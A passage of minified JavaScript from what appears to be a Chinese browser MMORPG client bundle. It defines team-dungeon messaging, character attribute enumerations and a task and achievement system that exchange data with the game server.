e=t.readInt(),i=t.readByte(),n=t.readByte(),o=[];o.length=n;for(var s,a=0;n>a;a++)s=new T.TeamFuBenRoleVo,o[a]=s,s.roleID=t.readInt(),s.position=t.readByte(),s.roleName=t.readString(),s.job=t.readByte(),s.isSignal=t.readByte();win.open("TeamFbResultWin",e,i,o)},e.prototype.sendPurgatoryTFRank=function(){this.sendBaseProto(90)},e.prototype.postPurgatoryTeamFuBenRank=function(t){this.tfPurgatoryPassRanks=[];for(var e,i,n=t.readByte(),o=0;n>o;o++){e={configID:t.readInt(),members:[]},i=t.readByte();for(var s=0;i>s;s++)e.members.push({position:t.readByte(),roleName:t.readString()});this.tfPurgatoryPassRanks.push(e)}},e.prototype.sendPurgatoryTfSysInvite=function(t){var e=this.getBytes(92);e.writeString(t),this.sendToServer(e)},e.prototype.teamPurgatoryFbSysInviteInfo=function(t){var e=t.readString(),i=t.readString(),n=m.LangUtils.analysis(e,i);v.ChatCT.ins().createNewChatMsg(n,0,e,!0)},e.prototype.postFbChat=function(t){var e=new y.ChatCampData;e.readData(t),this.chatCampDtList.addItem(e),v.ChatCT.ins().postNewChatMsg(e)},e.prototype.sendFbChat=function(t,e){var i=this.getBytes(43);i.writeShort(t),i.writeString(e),this.sendToServer(i)},e.prototype.isFBChatChannle=function(){return!1},e.prototype.monsterDrop=function(t){for(var e=(t.readDouble(),t.readByte()),i=0;e>i;i++){var n=new c.RewardData;n.type=t.readInt(),n.id=t.readInt(),n.count=t.readInt(),0==n.type&&1!=n.id&&2!=n.id}w.DropHelp.start()},e.prototype.sendFbLog=function(t){var e=this.getBytes(47);e.writeInt(t),this.sendToServer(e)},e.prototype.postFbLog=function(t){this.fbFirstLogs[t.readInt()]=1==t.readByte()},e.prototype.fightTime=function(t){var e=t.readInt();if(d.GameMap.checkIsInKf3v3()||d.GameMap.checkIsInInvade()||d.GameMap.checkIsInCrossDart()||d.GameMap.checkIsInGuildSoulsLand()||d.GameMap.checkIsInShouLei())e>0&&(e=e+.65+h.GlobalConfig.ScenesConfig[d.GameMap.mapID].waitAttackSec),A.KfArenaSys.ins().postFbInfo1(e);else if(0==e)C.ControlCC.setAuto(!1),C.ControlCC.setAuto(!0),win.get("MainBattleUi")||win.open("MainBattleUi",!0);else if(!win.get("MainBattleUi")){win.open("MainBattleUi"),this.setAutoUseSkill();var i=3650;Timer.start(i,1,function(){C.ControlCC.setAuto(!0)},this)}},e.prototype.setAutoUseSkill=function(){C.ControlCC.setAtuoUseSkill(!0),C.ControlCC.autoAwaitUseSkill()},e.prototype.openCrossDartCarMapWin=function(){win.open("CrossDartCarMapWin")},e.prototype.openHegemonyWin=function(){win.open(P.ZhanChangMainView,1)},e.FB_TYPE_GUANQIABOSS=1,e.FB_TYPE_CITY=2,e.FB_PVP=3,e.FB_TYPE_9=9,e.FB_KF=10,e.FB_TEAM=35,e.FB_TYPE_PEAKED=30,e.FB_TYPE_DEVILDOM_BOSS=39,e.FB_TYPE_FOREST=44,e.FB_TYPE_INVADE=46,e.FB_TYPE_CROSSDART=49,e.FB_TYPE_GUILD_WAR=14,e.FB_TYPE_QIYU_BOSS=45,e.FB_TYPE_SHI_KONG_ZHI_JING=100,e.FB_TYPE_LIU_DAO_LUN_HUI=47,e.FB_TYPE_SOULS=48,e.FB_TYPE_STARDOMAIN=52,e.FB_TYPE_LINGJING=53,e.FB_TYPE_CONTEST0=54,e.FB_TYPE_CONTEST=55,e.FB_TYPE_HEGEMONY=51,e.FB_TYPE_KF_ARENA=40,e.FB_TYPE_KF_DOMINATE=56,e.FB_TYPE_ROGUE=57,__decorate([post()],e.prototype,"postTeamFuBenRank",null),__decorate([post()],e.prototype,"postAddEnergy",null),__decorate([post()],e.prototype,"postPlayWarm",null),__decorate([post()],e.prototype,"postFbTime",null),__decorate([post()],e.prototype,"postExpFly",null),__decorate([post()],e.prototype,"postCreateTFRoomSuccess",null),__decorate([post()],e.prototype,"postEnterTFRoomSuccess",null),__decorate([post()],e.prototype,"postFTRoomChange",null),__decorate([post()],e.prototype,"postFTRoomPassInfo",null),__decorate([post()],e.prototype,"postFBInfoUpdate",null),__decorate([post()],e.prototype,"postCreatePurgatoryTFRoomSuccess",null),__decorate([post()],e.prototype,"postEnterPurgatoryTFRoomSuccess",null),__decorate([post()],e.prototype,"exitPurgatoryTFRoom",null),__decorate([post()],e.prototype,"postPurgatoryFTRoomChange",null),__decorate([post()],e.prototype,"postPurgatoryFTRoomPassInfo",null),__decorate([post()],e.prototype,"postPurgatoryTeamFuBenRank",null),__decorate([post()],e.prototype,"postFbChat",null),__decorate([post()],e.prototype,"postFbLog",null),__decorate([delayCall(500)],e.prototype,"setAutoUseSkill",null),__decorate([delayCall(500)],e.prototype,"openCrossDartCarMapWin",null),__decorate([delayCall(500)],e.prototype,"openHegemonyWin",null),e}(a.BaseSystem);e.FbCT=E,window.FbCT=E,__reflect(E.prototype,"FbCT",[]),Systemap.FbCT=function(){return E.ins()},window.FbCT=E},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType=e.ActivityBaseData=void 0;var n=i(7),o=i(8),s=function(t){function e(e,i){var n=t.call(this)||this;return i&&(n.id=i),n}return __extends(e,t),e.prototype.init=function(t,e){},e.prototype.update=function(t){},e.prototype.canReward=function(){return!1},Object.defineProperty(e.prototype,"rewardState",{get:function(){return 0},enumerable:!1,configurable:!0}),e.prototype.specialState=function(){return!0},e.prototype.getHide=function(){return!1},e.prototype.isOpenActivity=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(this.startTime)-n.GameServerCC.serverTime)/1e3),e=Math.floor((o.DateUtils.formatMiniDateTime(this.endTime)-n.GameServerCC.serverTime)/1e3);return 0>t&&e>0},e.prototype.getRemainTime=function(){var t,e=Math.floor((o.DateUtils.formatMiniDateTime(this.startTime)-n.GameServerCC.serverTime)/1e3),i=Math.floor((o.DateUtils.formatMiniDateTime(this.endTime)-n.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):o.DateUtils.getFormatBySecond(i,o.DateUtils.TIME_FORMAT_5,3)},e}(egret.HashObject);e.ActivityBaseData=s,window.ActivityBaseData=s,__reflect(s.prototype,"ActivityBaseData",[]),window.ActivityBaseData=s;var a;!function(t){t[t.Normal=0]="Normal",t[t.Personal=1]="Personal",t[t.Nesting=2]="Nesting"}(a=e.ActivityType||(e.ActivityType={})),window.ActivityType=a,window.ActivityType=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AttrSystemID=e.AttributeType=e.enPropActor=e.enPropAnimal=e.enPropEntity=void 0;var n;!function(t){t[t.P_ID=0]="P_ID",t[t.P_POS_X=1]="P_POS_X",t[t.P_POS_Y=2]="P_POS_Y",t[t.P_MODELID=3]="P_MODELID",t[t.P_ICON=4]="P_ICON",t[t.P_DIR=5]="P_DIR",t[t.P_MAX_ENTITY=6]="P_MAX_ENTITY"}(n=e.enPropEntity||(e.enPropEntity={})),window.enPropEntity=n;var o;!function(t){t[t.P_LEVEL=6]="P_LEVEL",t[t.P_HP=7]="P_HP",t[t.P_MP=8]="P_MP",t[t.P_SPEED=9]="P_SPEED",t[t.P_MAXHP=10]="P_MAXHP",t[t.P_MAXMP=11]="P_MAXMP",t[t.P_OUT_ATTACK=12]="P_OUT_ATTACK",t[t.P_OUT_DEFENCE=13]="P_OUT_DEFENCE",t[t.P_DEFCRITICALSTRIKES=14]="P_DEFCRITICALSTRIKES",t[t.P_ALL_ATTACK=15]="P_ALL_ATTACK",t[t.P_SUB_DEF=16]="P_SUB_DEF",t[t.P_IN_ATTACK=17]="P_IN_ATTACK",t[t.P_IN_DEFENCE=18]="P_IN_DEFENCE",t[t.P_CRITICALSTRIKES=19]="P_CRITICALSTRIKES",t[t.P_DODGERATE=20]="P_DODGERATE",t[t.P_HITRATE=21]="P_HITRATE",t[t.P_ATTACK_ADD=22]="P_ATTACK_ADD",t[t.P_HP_RENEW=23]="P_HP_RENEW",t[t.P_MP_RENEW=24]="P_MP_RENEW",t[t.P_ATTACK_SPEED=25]="P_ATTACK_SPEED",t[t.P_IN_ATTACK_DAMAGE_ADD=26]="P_IN_ATTACK_DAMAGE_ADD",t[t.P_OUT_ATTACK_DAMAGE_ADD=27]="P_OUT_ATTACK_DAMAGE_ADD",t[t.P_THUNDER_ATTACK=28]="P_THUNDER_ATTACK",t[t.P_THUNDER_DEFENCE=29]="P_THUNDER_DEFENCE",t[t.P_POISON_ATTACK=30]="P_POISON_ATTACK",t[t.P_POISON_DEFENCE=31]="P_POISON_DEFENCE",t[t.P_ICE_ATTACK=32]="P_ICE_ATTACK",t[t.P_ICE_DEFENCE=33]="P_ICE_DEFENCE",t[t.P_FIRE_ATTACK=34]="P_FIRE_ATTACK",t[t.P_FIRE_DEFENCE=35]="P_FIRE_DEFENCE",t[t.P_STATE=36]="P_STATE",t[t.P_BASE_MAXHP=37]="P_BASE_MAXHP",t[t.P_BASE_MAXMP=38]="P_BASE_MAXMP",t[t.P_STAND_POINT=39]="P_STAND_POINT",t[t.P_MAX_ANIMAL=40]="P_MAX_ANIMAL"}(o=e.enPropAnimal||(e.enPropAnimal={})),window.enPropAnimal=o;var s;!function(t){t[t.P_WEAPON=40]="P_WEAPON",t[t.P_MOUNT=41]="P_MOUNT",t[t.P_DIZZY_RATE11=42]="P_DIZZY_RATE11",t[t.P_DIZZY_TIME1=43]="P_DIZZY_TIME1",t[t.P_HP_STORE=44]="P_HP_STORE",t[t.P_MP_STORE=45]="P_MP_STORE",t[t.P_SPIRIT=46]="P_SPIRIT",t[t.P_PK_MOD=47]="P_PK_MOD",t[t.P_STRONG_EFFECT=48]="P_STRONG_EFFECT",t[t.P_WING=49]="P_WING",t[t.P_STAGE_EFFECT=50]="P_STAGE_EFFECT",t[t.P_PET_HP_STORE=51]="P_PET_HP_STORE",t[t.PROP_ACTOR_XIUWEI_RENEW_RATE=52]="PROP_ACTOR_XIUWEI_RENEW_RATE",t[t.P_SEX=53]="P_SEX",t[t.P_VOCATION=54]="P_VOCATION",t[t.P_EXP=55]="P_EXP",t[t.P_PK_VALUE=57]="P_PK_VALUE",t[t.P_BAG_GRID=58]="P_BAG_GRID",t[t.P_WEEK_CHARM=59]="P_WEEK_CHARM",t[t.P_BIND_COIN=60]="P_BIND_COIN",t[t.P_COIN=61]="P_COIN",t[t.P_BIND_YB=62]="P_BIND_YB",t[t.P_YB=63]="P_YB",t[t.P_SHENGWANG=64]="P_SHENGWANG",t[t.P_CHARM=65]="P_CHARM",t[t.P_SPIRIT_SLOT=66]="P_SPIRIT_SLOT",t[t.P_RENOWN=67]="P_RENOWN",t[t.P_GUILD_ID=68]="P_GUILD_ID",t[t.P_TEAM_ID=69]="P_TEAM_ID",t[t.P_SOCIAL=70]="P_SOCIAL",t[t.P_GUILD_EXP=71]="P_GUILD_EXP",t[t.P_LUCKY=72]="P_LUCKY",t[t.P_SYS_OPEN=73]="P_SYS_OPEN",t[t.P_ROOT_EXP_POWER=74]="P_ROOT_EXP_POWER",t[t.P_CHANGE_MODEL=75]="P_CHANGE_MODEL",t[t.PROP_BANGBANGTANG_EXP=76]="PROP_BANGBANGTANG_EXP",t[t.P_GIVE_YB=77]="P_GIVE_YB",t[t.P_CRITICAL_STRIKE=78]="P_CRITICAL_STRIKE",t[t.P_EXP_RATE=79]="P_EXP_RATE",t[t.P_DEPOT_GRID=80]="P_DEPOT_GRID",t[t.P_ANGER=81]="P_ANGER",t[t.P_ROOT_EXP=82]="P_ROOT_EXP",t[t.P_ACHIEVEPOINT=83]="P_ACHIEVEPOINT",t[t.P_ZYCONT=84]="P_ZYCONT",t[t.P_QQ_VIP=85]="P_QQ_VIP",t[t.P_WING_ID=86]="P_WING_ID",t[t.P_WING_SCORE=87]="P_WING_SCORE",t[t.P_PET_SCORE=88]="P_PET_SCORE",t[t.PROP_ACTOR_VIPFLAG=89]="PROP_ACTOR_VIPFLAG",t[t.P_CAMP=90]="P_CAMP",t[t.P_PET_SLOT=91]="P_PET_SLOT",t[t.P_HONOR=92]="P_HONOR",t[t.P_QING_YUAN=93]="P_QING_YUAN",t[t.PROP_ACTOR_DUR_KILLTIMES=94]="PROP_ACTOR_DUR_KILLTIMES",t[t.PROP_ACTOR_BASE_FIGHT=95]="PROP_ACTOR_BASE_FIGHT",t[t.P_FIGHT_VALUE=96]="P_FIGHT_VALUE",t[t.P_MAX_RENOWN=97]="P_MAX_RENOWN",t[t.P_RECHARGE=98]="P_RECHARGE",t[t.P_VIP_LEVEL=99]="P_VIP_LEVEL",t[t.P_BEAST_LEVEL=100]="P_BEAST_LEVEL",t[t.P_FOOT_EFFECT=101]="P_FOOT_EFFECT",t[t.P_EQUIP_SCORE=102]="P_EQUIP_SCORE",t[t.P_HAIR_MODEL=103]="P_HAIR_MODEL",t[t.P_BUBBLE=104]="P_BUBBLE",t[t.P_ACTOR_STATE=105]="P_ACTOR_STATE",t[t.P_JINGJIE_TITLE=106]="P_JINGJIE_TITLE",t[t.P_ZHUMOBI=107]="P_ZHUMOBI",t[t.P_WARSPIRIT=108]="P_WARSPIRIT",t[t.P_GUILDFB_SCORE=109]="P_GUILDFB_SCORE",t[t.P_SYS_OPENEX=110]="P_SYS_OPENEX",t[t.P_MAX_ACTOR=111]="P_MAX_ACTOR"}(s=e.enPropActor||(e.enPropActor={})),window.enPropActor=s;var a;!function(t){t[t.atHp=0]="atHp",t[t.atMp=1]="atMp",t[t.atMaxHp=2]="atMaxHp",t[t.atMaxMp=3]="atMaxMp",t[t.atAttack=4]="atAttack",t[t.atDef=5]="atDef",t[t.atRes=6]="atRes",t[t.atCrit=7]="atCrit",t[t.atTough=8]="atTough",t[t.atMoveSpeed=9]="atMoveSpeed",t[t.atAttackSpeed=10]="atAttackSpeed",t[t.atHpEx=11]="atHpEx",t[t.atAtkEx=12]="atAtkEx",t[t.atStunPower=13]="atStunPower",t[t.atStunRes=14]="atStunRes",t[t.atStunTime=15]="atStunTime",t[t.atDamageReduction=16]="atDamageReduction",t[t.atCritHurt=17]="atCritHurt",t[t.atRegeneration=18]="atRegeneration",t[t.atCritEnhance=19]="atCritEnhance",t[t.atPenetrate=20]="atPenetrate",t[t.atRoleDamageEnhance=21]="atRoleDamageEnhance",t[t.atRoleDamageReduction=22]="atRoleDamageReduction",t[t.atDefEx=23]="atDefEx",t[t.atResEx=24]="atResEx",t[t.cruNeiGong=25]="cruNeiGong",t[t.maxNeiGong=26]="maxNeiGong",t[t.neigongAbsorbHurt=27]="neigongAbsorbHurt",t[t.atJob1HpEx=28]="atJob1HpEx",t[t.atJob2HpEx=29]="atJob2HpEx",t[t.atJob3HpEx=30]="atJob3HpEx",t[t.atNeiGongRestore=31]="atNeiGongRestore",t[t.atVamirePro=32]="atVamirePro",t[t.atVamirePen=33]="atVamirePen",t[t.atVamireCd=34]="atVamireCd",t[t.atCursePro=35]="atCursePro",t[t.atCurseCd=36]="atCurseCd",t[t.atAttAddDamPro=37]="atAttAddDamPro",t[t.atAttAddDamVal=38]="atAttAddDamVal",t[t.atBeAttAddHpPro=39]="atBeAttAddHpPro",t[t.atBeAttAddHpVal=40]="atBeAttAddHpVal",t[t.atAttMbAddDamPen=41]="atAttMbAddDamPen",t[t.atHpLtAddBuff=42]="atHpLtAddBuff",t[t.atAttHpLtPenAddDam=43]="atAttHpLtPenAddDam",t[t.atAttHpLtAddDamPen=44]="atAttHpLtAddDamPen",t[t.atJob1AtkEx=45]="atJob1AtkEx",t[t.atJob2AtkEx=46]="atJob2AtkEx",t[t.atJob3AtkEx=47]="atJob3AtkEx",t[t.atJob1DefEx=48]="atJob1DefEx",t[t.atJob2DefEx=49]="atJob2DefEx",t[t.atJob3DefEx=50]="atJob3DefEx",t[t.atJob1ResEx=51]="atJob1ResEx",t[t.atJob2ResEx=52]="atJob2ResEx",t[t.atJob3ResEx=53]="atJob3ResEx",t[t.atAttPerDamPan=54]="atAttPerDamPan",t[t.atYuPeiDeterDam=55]="atYuPeiDeterDam",t[t.atCritEnhanceResist=56]="atCritEnhanceResist",t[t.atHolyDamege=57]="atHolyDamege",t[t.atHolyMaster=58]="atHolyMaster",t[t.atHolyResist=59]="atHolyResist",t[t.atTogetherHolyDamege=60]="atTogetherHolyDamege",t[t.atTogetherHolyMaster=61]="atTogetherHolyMaster",t[t.atTogetherHolyResist=62]="atTogetherHolyResist",t[t.atZhuiMingPro=63]="atZhuiMingPro",t[t.atZhuiMingVal=64]="atZhuiMingVal",t[t.atHuiXinDamage=65]="atHuiXinDamage",t[t.atNeiGongEx=66]="atNeiGongEx",t[t.atDeadLyPro=67]="atDeadLyPro",t[t.atDeadLyMaster=68]="atDeadLyMaster",t[t.atDeadLyResist=69]="atDeadLyResist",t[t.atAddEnemyHp=70]="atAddEnemyHp",t[t.atHurtMyself=71]="atHurtMyself",t[t.atBladeMailPro=72]="atBladeMailPro",t[t.atBladeMailPer=73]="atBladeMailPer",t[t.atDefPen=74]="atDefPen",t[t.atResPen=75]="atResPen",t[t.atDeadLyHurt=76]="atDeadLyHurt",t[t.atDeadLyHurtResist=77]="atDeadLyHurtResist",t[t.atCritHurtResist=78]="atCritHurtResist",t[t.atHunGuPro=79]="atHunGuPro",t[t.atHunGuHurt=80]="atHunGuHurt",t[t.atHunGuCd=81]="atHunGuCd",t[t.atHearthDamege=82]="atHearthDamege",t[t.atHearthHurt=83]="atHearthHurt",t[t.atHearthCount=84]="atHearthCount",t[t.atDblDef=85]="atDblDef",t[t.atMojianVamirePro=86]="atMojianVamirePro",t[t.atStunSelf=87]="atStunSelf",t[t.atAttackSpeedPower=88]="atAttackSpeedPower",t[t.atAttMbReductionDamPen=89]="atAttMbReductionDamPen",t[t.atShanghaiJiaShen=90]="atShanghaiJiaShen",t[t.atHalfHpAddDamage=91]="atHalfHpAddDamage",t[t.atDemonsSystemKillMonster=92]="atDemonsSystemKillMonster",t[t.atDemonsSystemEyeTriRate=93]="atDemonsSystemEyeTriRate",t[t.atDemonsSystemEyeHuntRate=94]="atDemonsSystemEyeHuntRate",t[t.atDemonsSystemIdentify=95]="atDemonsSystemIdentify",t[t.atDemonsSystemSnatchTreasure=96]="atDemonsSystemSnatchTreasure",t[t.atDemonsAtk=97]="atDemonsAtk",t[t.atDemonsDef=98]="atDemonsDef",t[t.atSkillHuntAddRate=99]="atSkillHuntAddRate",t[t.atSkillReduceRate=100]="atSkillReduceRate",t[t.atAddHurtRateToType12Monster=101]="atAddHurtRateToType12Monster",t[t.atAddDefRateToType12Monster=102]="atAddDefRateToType12Monster",t[t.atAddFinalHurtRate=103]="atAddFinalHurtRate",t[t.atAddFinalDefRate=104]="atAddFinalDefRate",t[t.atGoldAtk=105]="atGoldAtk",t[t.atGoldDef=106]="atGoldDef",t[t.atWoodAtk=107]="atWoodAtk",t[t.atWoodDef=108]="atWoodDef",t[t.atWaterAtk=109]="atWaterAtk",t[t.atWaterDef=110]="atWaterDef",t[t.atFireAtk=111]="atFireAtk",t[t.atFireDef=112]="atFireDef",t[t.atEarthAtk=113]="atEarthAtk",t[t.atEarthDef=114]="atEarthDef",t[t.atPenetrateRes=115]="atPenetrateRes",t[t.atAddBossDamage=116]="atAddBossDamage",t[t.atDecMonsterDamagePro=117]="atDecMonsterDamagePro",t[t.atDecMonsterDamageLevel=118]="atDecMonsterDamageLevel",t[t.atAddMonsterDamageRate=119]="atAddMonsterDamageRate",t[t.atAddMonsterDamagePro=120]="atAddMonsterDamagePro",t[t.atAddMonsterDamageLevel=121]="atAddMonsterDamageLevel",t[t.atMonsterShieldStatus=129]="atMonsterShieldStatus",t[t.atMonsterShieldParam=130]="atMonsterShieldParam",t[t.atMonsterShieldMaxParam=131]="atMonsterShieldMaxParam",t[t.atAtkMin=141]="atAtkMin",t[t.atAtkMax=142]="atAtkMax",t[t.atAtkTaoistMin=143]="atAtkTaoistMin",t[t.atAtkTaoistMax=144]="atAtkTaoistMax",t[t.atAtkMageMin=145]="atAtkMageMin",t[t.atAtkMageMax=146]="atAtkMageMax",t[t.atExp=147]="atExp",t[t.atHpAbsorb=148]="atHpAbsorb",t[t.atMpAbsorb=149]="atMpAbsorb",t[t.atMpEx=150]="atMpEx",t[t.addEvade=153]="addEvade",t[t.addAccuracy=154]="addAccuracy",t[t.atCoolDownTimeRatio=222]="atCoolDownTimeRatio"}(a=e.AttributeType||(e.AttributeType={})),window.AttributeType=a,window.AttributeType=a;var r;!function(t){t[t.asStart=0]="asStart",t[t.asLevel=0]="asLevel",t[t.asEnhance=1]="asEnhance",t[t.asZhuLing=2]="asZhuLing",t[t.asStone=3]="asStone",t[t.asLongHun=4]="asLongHun",t[t.asHeartMethod=5]="asHeartMethod",t[t.asHunGu=6]="asHunGu",t[t.asDemonCir=7]="asDemonCir",t[t.asEquip_point=8]="asEquip_point",t[t.asGuild_skill=9]="asGuild_skill",t[t.asZhuangban=10]="asZhuangban",t[t.asHeirloom=11]="asHeirloom",t[t.asWeaponsoul=12]="asWeaponsoul",t[t.asGodwing=13]="asGodwing",t[t.asReincarnate_equip=14]="asReincarnate_equip",t[t.asJadeplate=15]="asJadeplate",t[t.asZhizun=16]="asZhizun",t[t.asCount=17]="asCount"}(r=e.AttrSystemID||(e.AttrSystemID={})),window.AttrSystemID=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TaskCT=void 0;var n=i(55),o=i(14),s=i(0),a=i(4),r=i(9),l=i(56),h=i(627),u=i(7),p=i(2),d=i(282),c=i(631),f=i(283),g=i(632),m=i(284),v=i(85),y=i(24),C=i(17),T=i(13),b=i(22),w=i(6),I=i(8),_=i(342),S=i(128),x=function(t){function e(){var e=t.call(this)||this;e.vitality=0,e.weekVitality=0,e.achiEvement=[],e.investmentAllTask=[],e.dayNum=0,e.isInit=!0,e.experienceTaskAllConfig=[],e.titleTasks=[],e.titleNums={},e.qiyuData=[],e.zhanlingRed=new C.RedPoint,e.jijinRed=new C.RedPoint,e.dayTaskRed=new C.RedPoint,e.weekTaskRed=new C.RedPoint,e.titleTaskRed=new C.RedPoint,e.curTitleTaskId=-1,e.apparelTaskId=0,e.totalAttrs={},e.qiyuBossHurtRankList=[],e.limitTaskList=[],e.limitTaskDic={},e.limitTaskState=0,e.limitTaskCount=0,e.limitTaskEndTime=-1,e.currTaskListsId=-1,e.taskRp=new C.RedPoint,e.sysId=PackageID.Task,e.regNetMsg(1,e.doTaskData),e.regNetMsg(2,e.doTaskChangeData),e.regNetMsg(3,e.doVitality),e.regNetMsg(4,e.doVitalityAwards),e.regNetMsg(5,e.doAchieveData),e.regNetMsg(7,e.doJoinAchieveData),e.regNetMsg(8,e.doAchieveChangeData),e.regNetMsg(9,e.doLimitDataChange),e.regNetMsg(10,e.doUpdateLimitData),e.regNetMsg(11,e.onEncounterTaskData),e.regNetMsg(12,e.postInvestmentTaskData),e.regNetMsg(13,e.postOneInvestmentTask),e.regNetMsg(14,e.postCloseInvestmentTask),e.regNetMsg(15,e.doWeekTaskData),e.regNetMsg(16,e.doWeekTaskChangeData),e.regNetMsg(17,e.doWeekVitality),e.regNetMsg(18,e.doWeekVitalityAwards),e.regNetMsg(19,e.doTitleTaskInfo),e.regNetMsg(21,e.doQiyuInfo),e.regNetMsg(22,e.doQiyuInfoDelete),e.regNetMsg(23,e.qiyuBossInfoBack),e.regNetMsg(24,e.qiyuBossHurtRankBack),e.regNetMsg(26,e.syncQiyuBossInfo),e.achiEvement=[],observe(e,e.InitRedAll,T.SubRoles.ins().doSubRole);var i=e;return observe(e,function(){i.sendTitleTask()},T.SubRoles.ins().doSubRole),e}return __extends(e,t),e.prototype.InitRedAll=function(){this.initRed(),this.initTitleRp(),this.initTaskRp()},e.ins=function(){return t.ins.call(this)},e.prototype.onEncounterTaskData=function(t){var e=h.EncounterTreasureData.ins().parseTaskData(t);if(e[0]){var i=e[0];if(!s.GlobalConfig.DailyLineConfig)return;var n=s.GlobalConfig.DailyLineConfig[i.taskId];0!=i.taskStat||0==i.taskVar||this.isInit||p.TipsCT.ins().showCenterTips(gettext("解封秘宝{0}/{1}",i.taskVar,null===n||void 0===n?void 0:n.target)),this.isInit=!1}return e},e.prototype.finishTreasureMission=function(t){var e=this.getBytes(7);e.writeByte(t),this.sendToServer(e)},e.prototype.sendGetTask=function(t){var e=this.getBytes(1);e.writeInt(t),this.sendToServer(e)},e.prototype.sendGetVitalityAwards=function(t){var e=this.getBytes(2);e.writeInt(t),this.sendToServer(e)},e.prototype.sendGetAchieve=function(t){var e=this.getBytes(3);e.writeInt(t),this.sendToServer(e)},e.prototype.doTaskData=function(t){this.dayTask=[],this.vitalityAwards=[];for(var e=t.readInt(),i=0;e>i;i++){var n=new f.TaskData;n.id=t.readInt(),n.value=t.readInt(),n.state=t.readInt(),this.dayTask.push(n)}this.vitality=t.readInt();for(var o=t.readInt(),i=0;o>i;i++){var s=new g.VitalityData;s.id=t.readInt(),s.state=t.readInt(),this.vitalityAwards.push(s)}this.vitalityAwards.sort(function(t,e){return t.id<e.id?-1:1}),this.sortTask(),this.postTaskChangeData()},e.prototype.doTaskChangeData=function(t){var e=t.readInt(),i=this.getTaskDataById(e,2);i&&(i.value=t.readInt(),i.state=t.readInt(),this.sortTask(),this.postTaskChangeData())},e.prototype.postTaskChangeData=function(){},e.prototype.doVitality=function(t){this.vitality=t.readInt()},e.prototype.doVitalityAwards=function(t){var e=t.readInt(),i=this.getVitalityAwardsById(e);i.state=t.readInt(),this.postTaskChangeData()},e.prototype.doAchieveData=function(t){this.achiEvement.length=0;for(var e=t.readInt(),i=0;e>i;i++){var n=new d.AchievementData;n.achievementId=t.readInt(),n.id=t.readInt(),n.state=t.readInt(),n.value=t.readInt();var o=this.getAchieveConfById(n.id);null==o?console.warn("无法获得成就配置:"+n.id+"，请检查配置"):n.achievementType=o.achievementType,1e3==n.achievementId?(this.taskTrace=n,100003==this.taskTrace.id&&0==this.taskTrace.state,this.postUpdteTaskTrace()):this.achiEvement.push(n)}this.sortAchiEvement(),this.postUpdateAchieve()},e.prototype.checkActPet=function(t){if(t){var e=this.getAchieveConfById(t.id);!e||v.Setting.ins().getValue(v.ClientSet.showPet)}},e.prototype.getTaskData=function(t,e){for(var i,n=this.achiEvement.length,o=0;n>o;o++){var s=this.achiEvement[o];if(s.achievementId==t&&s.id==e){i=s;break}}return i},e.prototype.getTaskTarget=function(t){var e=0,i=this.getAchieveConfById(t);return i&&(e=i.target),e},e.prototype.postUpdateAchieve=function(){},e.prototype.postUpdteTaskTrace=function(){},e.prototype.postUpdteLimitTaskData=function(t){return t},e.prototype.doJoinAchieveData=function(t){this.changeAchieve(t)},e.prototype.doAchieveChangeData=function(t){this.changeAchieve(t)},e.prototype.doLimitDataChange=function(t){var e=t.readByte();if(this.limitTaskState=e,this.limitTaskCount=0,0==e)this.currTaskListsId=t.readInt(),this.initLimitTaskData(this.currTaskListsId);else if(1==e){this.currTaskListsId=t.readInt(),this.initLimitTaskData(this.currTaskListsId),this.limitTaskEndTime=t.readInt();var i=s.GlobalConfig.LimitTimeConfig[this.currTaskListsId];1==this.currTaskListsId&&i.time==this.limitTaskEndTime&&win.open("LimitStartTipsView"),this.limitTaskEndTime+=Math.floor(u.GameServerCC.serverTime/1e3);for(var n=t.readShort(),o=0;n>o;o++){var a=t.readInt();this.limitTaskDic[a].parser(t),2==this.limitTaskDic[a].state&&this.limitTaskCount++}}this.postUpdteLimitTaskData()},e.prototype.initLimitTaskData=function(t){this.limitTaskList=[],this.limitTaskDic={};var e=s.GlobalConfig.LimitTimeConfig[t];for(var i in e.taskIds){var n=s.GlobalConfig.LimitTimeTaskConfig[e.taskIds[i]],o=new c.LimitTaskData;o.setBaseData(n),this.limitTaskList.push(o),this.limitTaskDic[o.id]=o}},e.prototype.doUpdateLimitData=function(t){var e=t.readInt(),i=this.limitTaskDic[e];return i?(i.parser(t),2==i.state&&this.limitTaskCount++,void this.postUpdteLimitTaskData(i)):void console.log("限时任务未初始化："+e)},e.prototype.sendGetLimitTask=function(){this.sendBaseProto(5)},e.prototype.sendGetLimitTaskReward=function(t){var e=this.getBytes(6);e.writeInt(t),this.sendToServer(e)},e.prototype.changeAchieve=function(t){var e,i=t.readInt();return(e=1e3==i?this.taskTrace:this.getAchieveDataById(i))?(e.id=t.readInt(),e.state=t.readInt(),e.value=t.readInt(),void(1e3==e.achievementId?this.postUpdteTaskTrace():0!=e.achievementType?this.postUpdateAchieve():(this.sortAchiEvement(),this.postTaskChangeData()))):void console.error("--成就数据空--",i)},e.prototype.getChengjiuDataByType=function(t){if(void 0==this.achiEvement)return void console.log("通过成就类型获取成就数据  achiEvement = null");for(var e=[],i=0;i<this.achiEvement.length;i++)this.achiEvement[i].achievementType==t&&e.push(this.achiEvement[i]);return this.sortAchievementAcByType(e)},e.prototype.sortAchievementAcByType=function(t){return t&&t.sort(function(t,e){return 2==t.state?1:2==e.state?-1:e.state-t.state}),t},e.prototype.getAchieveDataById=function(t){if(void 0==this.achiEvement)return void console.log("通过成就类型获取成就数据  achiEvement = null");for(var e=0;e<this.achiEvement.length;e++)if(this.achiEvement[e].achievementId==t)return this.achiEvement[e];return null},e.prototype.getAchieveByTaskId=function(t){for(var e=0;e<this.achiEvement.length;e++)if(this.achiEvement[e].id==t)return this.achiEvement[e];return null},e.prototype.getVitalityAwardsById=function(t,e){var i=e&&1==e?this.weekVitalityAwards:this.vitalityAwards;if(!i)return null;for(var n=0;n<i.length;n++)if(i[n].id==t)return i[n];return null},e.prototype.getTaskDataById=function(t,e){var i=e&&1==e?this.weekTask:this.dayTask;if(!i)return null;for(var n=0;n<i.length;n++)if(i[n].id==t)return i[n];return 